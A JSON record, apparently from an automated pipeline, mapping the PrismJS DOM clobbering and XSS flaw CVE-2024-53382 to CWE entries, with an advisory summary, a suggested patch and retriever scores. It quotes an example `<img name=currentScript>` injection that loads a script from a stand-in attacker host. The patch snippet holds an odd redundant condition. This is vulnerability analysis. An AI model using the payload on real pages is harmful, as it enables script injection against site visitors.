{
  "cve_id": "CVE-2024-53382",
  "description": "Prism (aka PrismJS) through 1.29.0 allows DOM Clobbering (with resultant XSS for untrusted input that contains HTML but does not directly contain JavaScript), because document.currentScript lookup can be shadowed by attacker-injected HTML elements.",
  "key_phrases": {
    "component": "",
    "rootcause": "document.currentScript lookup shadowing",
    "vector": "untrusted input with HTML",
    "weakness": "XSS, DOM Clobbering",
    "product": "Prism (aka PrismJS)",
    "impact": "",
    "attacker": "",
    "version": "through 1.29.0"
  },
  "reference_content": "## Analysis of CVE-2024-53382 Content\n\nThe provided content **IS RELATED** to a vulnerability affecting the Prism library. It details a DOM Clobbering vulnerability in the `prism-autoloader` plugin (version 1.29.0) that can lead to Cross-Site Scripting (XSS) attacks.\n\nHere's a breakdown of the extracted information:\n\n**Root cause of vulnerability:**\n\nThe vulnerability stems from the use of `document.currentScript` in the `prism-autoloader.js` plugin without proper type checking. An attacker can shadow this value with a controlled HTML element (e.g., an `<img>` tag with a specific `name` attribute).\n\n**Weaknesses/vulnerabilities present:**\n\n*   **DOM Clobbering:** The core weakness is the ability to overwrite the `document.currentScript` object with an attacker-controlled element.\n*   **Lack of Input Validation:** The code doesn't validate that `document.currentScript` is actually a `<script>` element before accessing its attributes.\n\n**Impact of exploitation:**\n\nSuccessful exploitation can lead to:\n\n*   **Arbitrary script loading:** The attacker can control the `languages_path` used to load additional scripts, potentially pointing to a malicious domain.\n*   **Cross-Site Scripting (XSS):**  Loading scripts from the attacker's server allows for arbitrary code execution in the context of the vulnerable webpage.\n\n**Attack vectors:**\n\n*   An attacker can inject a malicious HTML element (e.g., `<img name=currentScript src=\"http://attacker.controlled.com/a.js\">`) into a webpage that uses Prism and the `prism-autoloader` plugin. This injection could occur through user-supplied content (e.g., comments, forum posts) if not properly sanitized.\n\n**Required attacker capabilities/position:**\n\n*   The attacker needs to be able to inject HTML content into a webpage that uses Prism and the `prism-autoloader` plugin. This typically requires the ability to post or comment on the webpage or otherwise contribute content that is rendered as HTML.\n\n**Mitigation or fix:**\n\nThe suggested patch involves adding a type check to ensure that `document.currentScript` is a `<script>` element before accessing its attributes:\n\n```javascript\ncurrentScript: function () {\n\tif ('currentScript' in document && 1 < 2 && document.currentScript.tagName.toUpperCase() === 'SCRIPT') {\n\t\treturn /** @type {any} */ document.currentScript;\n\t}\n},\n```\n\n**Additional Details:**\n\n*   The content references similar vulnerabilities in other popular libraries (Webpack, Vite, layui) which provides context and highlights the broader risk of DOM Clobbering.\n*   A Proof-of-Concept (PoC) is provided, demonstrating how an attacker can load a script from a controlled domain.\n*   The content provides specific code snippets from the Prism library to illustrate the vulnerable code.\n\n**Note:** This content provides more detail than a typical CVE description, including a PoC and a suggested patch.",
  "similar_info": {
    "cwe_distribution": {},
    "cwe_consensus": "",
    "similarity_stats": {
      "thresholds": [],
      "total_samples_by_threshold": {},
      "top_cwes_by_threshold": {}
    }
  },
  "similarity_summary": {
    "consensus_cwe": "",
    "top_cwes": [],
    "confidence_levels": {},
    "total_samples": 0
  },
  "analysis": "# Summary\n| CWE ID | CWE Name | Confidence | CWE Abstraction Level | CWE Vulnerability Mapping Label | CWE-Vulnerability Mapping Notes |\n|---|---|---|---|---|---|\n| CWE-79 | Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') | 1.0 | Base | Allowed | Primary CWE. The core weakness is the ability to overwrite the `document.currentScript` object with an attacker-controlled element and leads to XSS. |\n| CWE-83 | Improper Neutralization of Script in Attributes in a Web Page | 0.7 | Variant | Allowed | Secondary CWE. The attacker can inject a malicious HTML element and load a script from a controlled domain. |\n| CWE-471 | Modification of Assumed-Immutable Data (MAID) | 0.4 | Base | Allowed |  Secondary CWE. The vulnerability stems from the use of `document.currentScript` in the `prism-autoloader.js` plugin without proper type checking. An attacker can shadow this value with a controlled HTML element |\n\n## Evidence and Confidence\n\n*   **Confidence Score:** 0.9\n*   **Evidence Strength:** HIGH\n\n## Relationship Analysis\nThe primary CWE is CWE-79, which describes the XSS vulnerability resulting from improper neutralization. CWE-83 is a variant of CWE-79 and deals with the specific case of improper neutralization of script in attributes. CWE-471 relates to the modification of assumed-immutable data, which in this case is the `document.currentScript` object. The relationship between these CWEs helps to understand the specific nature of the vulnerability.\n\n```mermaid\ngraph TD\n    cwe79[\"CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\"]\n    cwe83[\"CWE-83: Improper Neutralization of Script in Attributes in a Web Page\"]\n    cwe471[\"CWE-471: Modification of Assumed-Immutable Data (MAID)\"]\n    \n    cwe83 -->|CHILDOF| cwe79\n    \n    classDef primary fill:#f96,stroke:#333,stroke-width:2px\n    classDef secondary fill:#69f,stroke:#333\n    classDef tertiary fill:#9e9,stroke:#333\n    class cwe79 primary\n    class cwe83 secondary\n    class cwe471 tertiary\n```\n\n## Vulnerability Chain\nThe vulnerability chain starts with the **rootcause** of **document.currentScript lookup shadowing**, leading to DOM Clobbering. This allows an attacker to inject a malicious HTML element, which then results in Cross-Site Scripting (XSS).\n  - Initial Flaw: DOM Clobbering vulnerability in the `prism-autoloader` plugin due to missing type checking on `document.currentScript`.\n  - Weakness 1: **Improper Neutralization of Input** (CWE-79) - The product doesn't neutralize or incorrectly neutralizes user-controllable input before it is placed in output that is used as a web page.\n  - Weakness 2: **Modification of Assumed-Immutable Data** (CWE-471) - The `document.currentScript` object is assumed to be immutable but is modified by attacker-controlled HTML.\n  - Final Impact: **Cross-Site Scripting (XSS)** - Arbitrary code execution in the context of the vulnerable webpage.\n\n## Summary of Analysis\nThe analysis is based on the vulnerability description and the provided CVE content summary. The primary weakness is clearly XSS (CWE-79) as the attacker can inject arbitrary code. The root cause involves DOM Clobbering due to the shadowing of `document.currentScript`.\n\nThe evidence from \"CVE Reference Links Content Summary\" says:\n\"The vulnerability stems from the use of `document.currentScript` in the `prism-autoloader.js` plugin without proper type checking. An attacker can shadow this value with a controlled HTML element (e.g., an `<img>` tag with a specific `name` attribute).\"\n\nThe retriever results support the selection of CWE-79 as the primary weakness.\n\nThe relationships between CWEs clarify the vulnerability. CWE-83 (Improper Neutralization of Script in Attributes in a Web Page) is a variant of CWE-79 and relates to the specific attack vector of injecting malicious HTML attributes.\n\nCWE-471 has a lower confidence because it describes a more general class of vulnerability, but it is still applicable as the `document.currentScript` object is being modified.\n\nThe selected CWEs are at the optimal level of specificity as they describe the vulnerability accurately and provide actionable information for remediation.\n\nRelevant CWE Information:\n*   **CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')**\n    *   The product does not neutralize or incorrectly neutralizes user-controllable input before it is placed in output that is used as a web page that is served to other users.\n*   **CWE-83: Improper Neutralization of Script in Attributes in a Web Page**\n    *   Improper Neutralization of Script in Attributes in a Web Page\n*   **CWE-471: Modification of Assumed-Immutable Data (MAID)**\n    *   Modification of Assumed-Immutable Data (MAID)\n\nOther CWEs Considered but Not Used:\n\n*   CWE-116 (Improper Encoding or Escaping of Output), CWE-138 (Improper Neutralization of Special Elements) - These are more general and less specific than CWE-79.\n*   CWE-95 (Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval Injection')) - While code is being dynamically evaluated, the primary issue is the lack of neutralization leading to XSS.\n*   CWE-611 (Improper Restriction of XML External Entity Reference), CWE-112 (Missing XML Validation) - Not relevant as the vulnerability is not related to XML processing.\n*   CWE-1333 (Inefficient Regular Expression Complexity) - Not relevant as the vulnerability is not related to regular expressions.\n*   CWE-356 (Product UI does not Warn User of Unsafe Actions) - Not relevant as the vulnerability is not related to UI warnings.",
  "analysis_with_relationships": "# Summary\n| CWE ID | CWE Name | Confidence | CWE Abstraction Level | CWE Vulnerability Mapping Label | CWE-Vulnerability Mapping Notes |\n|---|---|---|---|---|---|\n| CWE-79 | Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') | 1.0 | Base | Allowed | Primary CWE. The core weakness is the ability to overwrite the `document.currentScript` object with an attacker-controlled element and leads to XSS. |\n| CWE-83 | Improper Neutralization of Script in Attributes in a Web Page | 0.7 | Variant | Allowed | Secondary CWE. The attacker can inject a malicious HTML element and load a script from a controlled domain. |\n| CWE-471 | Modification of Assumed-Immutable Data (MAID) | 0.4 | Base | Allowed |  Secondary CWE. The vulnerability stems from the use of `document.currentScript` in the `prism-autoloader.js` plugin without proper type checking. An attacker can shadow this value with a controlled HTML element |\n\n## Evidence and Confidence\n\n*   **Confidence Score:** 0.9\n*   **Evidence Strength:** HIGH\n\n## Relationship Analysis\nThe primary CWE is CWE-79, which describes the XSS vulnerability resulting from improper neutralization. CWE-83 is a variant of CWE-79 and deals with the specific case of improper neutralization of script in attributes. CWE-471 relates to the modification of assumed-immutable data, which in this case is the `document.currentScript` object. The relationship between these CWEs helps to understand the specific nature of the vulnerability.\n\n```mermaid\ngraph TD\n    cwe79[\"CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\"]\n    cwe83[\"CWE-83: Improper Neutralization of Script in Attributes in a Web Page\"]\n    cwe471[\"CWE-471: Modification of Assumed-Immutable Data (MAID)\"]\n    \n    cwe83 -->|CHILDOF| cwe79\n    \n    classDef primary fill:#f96,stroke:#333,stroke-width:2px\n    classDef secondary fill:#69f,stroke:#333\n    classDef tertiary fill:#9e9,stroke:#333\n    class cwe79 primary\n    class cwe83 secondary\n    class cwe471 tertiary\n```\n\n## Vulnerability Chain\nThe vulnerability chain starts with the **rootcause** of **document.currentScript lookup shadowing**, leading to DOM Clobbering. This allows an attacker to inject a malicious HTML element, which then results in Cross-Site Scripting (XSS).\n  - Initial Flaw: DOM Clobbering vulnerability in the `prism-autoloader` plugin due to missing type checking on `document.currentScript`.\n  - Weakness 1: **Improper Neutralization of Input** (CWE-79) - The product doesn't neutralize or incorrectly neutralizes user-controllable input before it is placed in output that is used as a web page.\n  - Weakness 2: **Modification of Assumed-Immutable Data** (CWE-471) - The `document.currentScript` object is assumed to be immutable but is modified by attacker-controlled HTML.\n  - Final Impact: **Cross-Site Scripting (XSS)** - Arbitrary code execution in the context of the vulnerable webpage.\n\n## Summary of Analysis\nThe analysis is based on the vulnerability description and the provided CVE content summary. The primary weakness is clearly XSS (CWE-79) as the attacker can inject arbitrary code. The root cause involves DOM Clobbering due to the shadowing of `document.currentScript`.\n\nThe evidence from \"CVE Reference Links Content Summary\" says:\n\"The vulnerability stems from the use of `document.currentScript` in the `prism-autoloader.js` plugin without proper type checking. An attacker can shadow this value with a controlled HTML element (e.g., an `<img>` tag with a specific `name` attribute).\"\n\nThe retriever results support the selection of CWE-79 as the primary weakness.\n\nThe relationships between CWEs clarify the vulnerability. CWE-83 (Improper Neutralization of Script in Attributes in a Web Page) is a variant of CWE-79 and relates to the specific attack vector of injecting malicious HTML attributes.\n\nCWE-471 has a lower confidence because it describes a more general class of vulnerability, but it is still applicable as the `document.currentScript` object is being modified.\n\nThe selected CWEs are at the optimal level of specificity as they describe the vulnerability accurately and provide actionable information for remediation.\n\nRelevant CWE Information:\n*   **CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')**\n    *   The product does not neutralize or incorrectly neutralizes user-controllable input before it is placed in output that is used as a web page that is served to other users.\n*   **CWE-83: Improper Neutralization of Script in Attributes in a Web Page**\n    *   Improper Neutralization of Script in Attributes in a Web Page\n*   **CWE-471: Modification of Assumed-Immutable Data (MAID)**\n    *   Modification of Assumed-Immutable Data (MAID)\n\nOther CWEs Considered but Not Used:\n\n*   CWE-116 (Improper Encoding or Escaping of Output), CWE-138 (Improper Neutralization of Special Elements) - These are more general and less specific than CWE-79.\n*   CWE-95 (Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval Injection')) - While code is being dynamically evaluated, the primary issue is the lack of neutralization leading to XSS.\n*   CWE-611 (Improper Restriction of XML External Entity Reference), CWE-112 (Missing XML Validation) - Not relevant as the vulnerability is not related to XML processing.\n*   CWE-1333 (Inefficient Regular Expression Complexity) - Not relevant as the vulnerability is not related to regular expressions.\n*   CWE-356 (Product UI does not Warn User of Unsafe Actions) - Not relevant as the vulnerability is not related to UI warnings.\n\n\n## CWE Relationship Analysis\n\nCurrent CWEs represent these abstraction levels: .\n\n\n### Vulnerability Chain Analysis\n\n**Chain starting from CWE-471:**\n- 471 (Modification of Assumed-Immutable Data (MAID)) - ROOT\n\n\n**Chain starting from CWE-611:**\n- 611 (Improper Restriction of XML External Entity Reference) - ROOT\n\n\n\n### CWE Relationship Diagram\n\n```mermaid\ngraph TD\n    classDef primary fill:#f96,stroke:#333,stroke-width:2px\n    classDef secondary fill:#69f,stroke:#333\n    classDef tertiary fill:#9e9,stroke:#333\n```",
  "criticism": "",
  "resolution": "",
  "relevant_cwes": [
    {
      "metadata": {
        "doc_id": "79",
        "name": "Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')",
        "source": "alternate_terms",
        "original_matched_text": "AlternateTerms: XSS",
        "match_reason": "exact_match_compound_part_0"
      },
      "similarity": 1000.0,
      "alternate_term_match": true
    },
    {
      "metadata": {
        "doc_id": "116",
        "name": "Improper Encoding or Escaping of Output",
        "source": "sparse"
      },
      "similarity": 210.32798185461453
    },
    {
      "metadata": {
        "doc_id": "138",
        "name": "Improper Neutralization of Special Elements",
        "source": "sparse"
      },
      "similarity": 172.48585812726702
    },
    {
      "metadata": {
        "doc_id": "112",
        "name": "Missing XML Validation",
        "source": "sparse"
      },
      "similarity": 170.9097169284917
    },
    {
      "metadata": {
        "doc_id": "1333",
        "name": "Inefficient Regular Expression Complexity",
        "source": "sparse"
      },
      "similarity": 163.62296894942978
    },
    {
      "metadata": {
        "doc_id": "356",
        "name": "Product UI does not Warn User of Unsafe Actions",
        "source": "sparse"
      },
      "similarity": 160.78147893645664
    },
    {
      "metadata": {
        "doc_id": "611",
        "name": "Improper Restriction of XML External Entity Reference",
        "source": "sparse"
      },
      "similarity": 155.65663311805582
    },
    {
      "metadata": {
        "doc_id": "95",
        "name": "Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval Injection')",
        "source": "sparse"
      },
      "similarity": 146.83546338240004
    },
    {
      "metadata": {
        "doc_id": "83",
        "name": "Improper Neutralization of Script in Attributes in a Web Page",
        "type": "Variant",
        "original_content": "The product does not neutralize or incorrectly neutralizes \"javascript:\" or other URIs from dangerous attributes within tags, such as onmouseover, onload, onerror, or style.",
        "keyphrase_source": "weakness:DOM Clobbering",
        "source": "dense",
        "mapping_notes": {
          "usage": "Allowed",
          "rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
          "comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
          "reasons": [
            "Acceptable-Use"
          ]
        },
        "score_info": {
          "retrievers": [
            "dense",
            "graph"
          ],
          "retriever_count": 2,
          "normalized_scores": {
            "dense": 0.5439148880451984,
            "graph": 1.5407646459234094
          }
        }
      },
      "similarity": 0.5439148880451984
    },
    {
      "doc_id": "471",
      "text": "CWE-471: Modification of Assumed-Immutable Data (MAID)",
      "score": 2.2100000000000004,
      "metadata": {
        "doc_id": "471",
        "name": "Modification of Assumed-Immutable Data (MAID)",
        "type": "base",
        "original_content": "CWE-471: Modification of Assumed-Immutable Data (MAID)",
        "relationships": [
          {
            "source_id": "471",
            "target_id": "621",
            "label": "CANFOLLOW",
            "properties": {
              "view_id": "1000"
            }
          },
          {
            "source_id": "471",
            "target_id": "607",
            "label": "PARENTOF",
            "properties": {
              "ordinal": "Primary",
              "view_id": "1000"
            }
          },
          {
            "source_id": "471",
            "target_id": "602",
            "label": "CANFOLLOW",
            "properties": {
              "view_id": "1000"
            }
          },
          {
            "source_id": "471",
            "target_id": "473",
            "label": "PARENTOF",
            "properties": {
              "ordinal": "Primary",
              "view_id": "1000"
            }
          },
          {
            "source_id": "471",
            "target_id": "472",
            "label": "PARENTOF",
            "properties": {
              "view_id": "1000"
            }
          },
          {
            "source_id": "471",
            "target_id": "425",
            "label": "CANFOLLOW",
            "properties": {
              "view_id": "1000"
            }
          },
          {
            "source_id": "471",
            "target_id": "291",
            "label": "PARENTOF",
            "properties": {
              "view_id": "1000"
            }
          },
          {
            "source_id": "471",
            "target_id": "1321",
            "label": "CANFOLLOW",
            "properties": {
              "ordinal": "Primary",
              "view_id": "1000"
            }
          },
          {
            "source_id": "471",
            "target_id": "1282",
            "label": "CANFOLLOW",
            "properties": {
              "view_id": "1000"
            }
          },
          {
            "source_id": "471",
            "target_id": "664",
            "label": "CHILDOF",
            "properties": {
              "ordinal": "Primary",
              "view_id": "1000"
            }
          },
          {
            "source_id": "664",
            "target_id": "471",
            "label": "PARENTOF",
            "properties": {
              "ordinal": "Primary",
              "view_id": "1000"
            }
          },
          {
            "source_id": "621",
            "target_id": "471",
            "label": "CANPRECEDE",
            "properties": {
              "view_id": "1000"
            }
          },
          {
            "source_id": "607",
            "target_id": "471",
            "label": "CHILDOF",
            "properties": {
              "ordinal": "Primary",
              "view_id": "1000"
            }
          },
          {
            "source_id": "602",
            "target_id": "471",
            "label": "CANPRECEDE",
            "properties": {
              "view_id": "1000"
            }
          },
          {
            "source_id": "473",
            "target_id": "471",
            "label": "CHILDOF",
            "properties": {
              "ordinal": "Primary",
              "view_id": "1000"
            }
          },
          {
            "source_id": "472",
            "target_id": "471",
            "label": "CHILDOF",
            "properties": {
              "view_id": "1000"
            }
          },
          {
            "source_id": "425",
            "target_id": "471",
            "label": "CANPRECEDE",
            "properties": {
              "view_id": "1000"
            }
          },
          {
            "source_id": "291",
            "target_id": "471",
            "label": "CHILDOF",
            "properties": {
              "view_id": "1000"
            }
          },
          {
            "source_id": "1321",
            "target_id": "471",
            "label": "CANPRECEDE",
            "properties": {
              "ordinal": "Primary",
              "view_id": "1000"
            }
          },
          {
            "source_id": "1282",
            "target_id": "471",
            "label": "CANPRECEDE",
            "properties": {
              "view_id": "1000"
            }
          }
        ],
        "score_components": {
          "relationship_chain": 1.0,
          "sequence_path": 1.0
        },
        "abstraction_factor": 1.3,
        "graph_path_info": {
          "path_types": [
            "relationship_chain",
            "vulnerability_sequence_forward"
          ],
          "best_paths": {
            "relationship_chain": {
              "path": [
                [
                  "1321",
                  "471",
                  "CANPRECEDE"
                ]
              ],
              "score": 1.0,
              "type": "relationship_chain",
              "source": "1321"
            },
            "vulnerability_sequence_forward": {
              "path": [
                [
                  "1321",
                  "471",
                  "CANPRECEDE"
                ]
              ],
              "score": 1.0,
              "type": "vulnerability_sequence_forward",
              "source": "1321"
            }
          }
        },
        "position": "after",
        "sources": [
          "graph"
        ],
        "source": "graph",
        "mapping_notes": {
          "usage": "Allowed",
          "rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
          "comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
          "reasons": [
            "Acceptable-Use"
          ]
        },
        "score_info": {
          "retrievers": [
            "graph"
          ],
          "retriever_count": 1,
          "normalized_scores": {
            "graph": 2.2100000000000004
          }
        }
      },
      "similarity": 2.2100000000000004
    }
  ],
  "identified_cwes": {
    "analyzer": [
      "CWE-471",
      "CWE-611",
      "CWE-116",
      "CWE-79",
      "CWE-112",
      "CWE-356",
      "CWE-95",
      "CWE-138",
      "CWE-83",
      "CWE-1333"
    ],
    "critic_additional": []
  },
  "keyphrase_cwe_mapping": {}
}